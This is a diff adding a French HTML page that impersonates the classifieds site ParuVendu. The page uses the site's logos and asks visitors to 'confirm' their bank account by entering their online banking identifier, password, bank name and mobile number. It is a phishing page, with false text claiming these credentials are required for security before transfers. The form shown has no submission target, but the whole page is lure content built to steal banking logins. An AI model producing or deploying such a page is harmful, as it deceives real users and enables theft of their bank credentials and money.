@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmation Bancaire - ParuVendu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: url('https://github.com/zapata225/lebon/blob/main/paruvendu.png?raw=true');
+            background-position: right;
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+        .logo img {
+            width: 200px;
+        }
+        .container {
+            width: 30%; /* Largeur du formulaire */
+            padding: 30px; /* Padding */
+            background: white;
+            border-radius: 30px; /* Bords plus enrobés */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            position: absolute;
+            top: 30%; /* Hauteur */
+            left: 15%; /* Déplacé plus à gauche */
+            transform: translateY(-30%);
+            animation: slideUp 1s ease-out;
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(-30%);
+            }
+        }
+        .form-group {
+            margin-bottom: 15px; /* Espacement entre les champs */
+            text-align: left;
+        }
+        input {
+            width: 100%; /* Largeur des champs */
+            padding: 12px; /* Padding */
+            border: 1px solid #ccc;
+            border-radius: 0; /* Bordures rectangulaires */
+            font-size: 14px;
+            transition: all 0.3s;
+            background-color: #f9f9f9;
+            box-sizing: border-box; /* Assure que la largeur inclut le padding */
+        }
+        input:focus {
+            border-color: #ff4c4c;
+            box-shadow: 0 0 5px rgba(255, 76, 76, 0.5);
+        }
+        .btn {
+            background-color: #cc0000; /* Rouge plus foncé */
+            color: white;
+            padding: 8px 20px; /* Taille réduite */
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            width: 40%; /* Bouton plus petit */
+            font-size: 14px; /* Taille du texte */
+            transition: background 0.3s;
+            text-transform: lowercase; /* Mise en minuscule */
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+            font-weight: bold; /* Texte en gras */
+        }
+        .btn:hover {
+            background-color: #b30000; /* Rouge plus foncé au survol */
+        }
+        .connexion-text {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff4c4c;
+            margin-bottom: 20px;
+        }
+        .form-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-logo img {
+            width: 100px; /* Taille du logo */
+        }
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            text-align: justify;
+        }
+        .info-text strong {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="ParuVendu">
+    </div>
+    <div class="container">
+        <div class="connexion-text">Confirmez le compte bancaire</div>
+        <div class="form-logo">
+            <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
+        </div>
+        <form>
+            <div class="form-group">
+                <label for="bank-id">Identifiant Bancaire</label>
+                <input type="text" id="bank-id" required>
+            </div>
+            <div class="form-group">
+                <label for="bank-password">Mot de passe</label>
+                <input type="password" id="bank-password" required>
+            </div>
+            <div class="form-group">
+                <label for="bank-name">Nom de la banque</label>
+                <input type="text" id="bank-name" required>
+            </div>
+            <div class="form-group">
+                <label for="mobile">Numéro de mobile</label>
+                <input type="text" id="mobile" required>
+            </div>
+            <button type="submit" class="btn">Confirmer</button>
+        </form>
+        <div class="info-text">
+            <strong>Pourquoi dois-je vérifier les informations financières ?</strong><br>
+            Pour bénéficier pleinement de votre compte ParuVendu et pouvoir transférer votre argent de votre compte ParuVendu vers votre compte bancaire et vice-versa, vous devez obligatoirement confirmer votre compte bancaire à l'aide de vos identifiants de connexion en ligne par mesure de sécurité.
+        </div>
+        <div class="info-text">
+            <strong>Si votre compte ParuVendu a été piraté :</strong><br>
+            Un individu mal intentionné pourrait réceptionner votre paiement en votre nom. La vérification bancaire permet de pallier ce risque. ParuVendu vous demande de vérifier votre compte de sorte que les futurs transferts ne soient pas envoyés vers un mauvais compte bancaire.
+        </div>
+        <div class="info-text">
+            <strong>Fin de la vérification !</strong><br>
+            ParuVendu vous remercie de votre confiance.
+        </div>
+    </div>
+</body>
+</html>
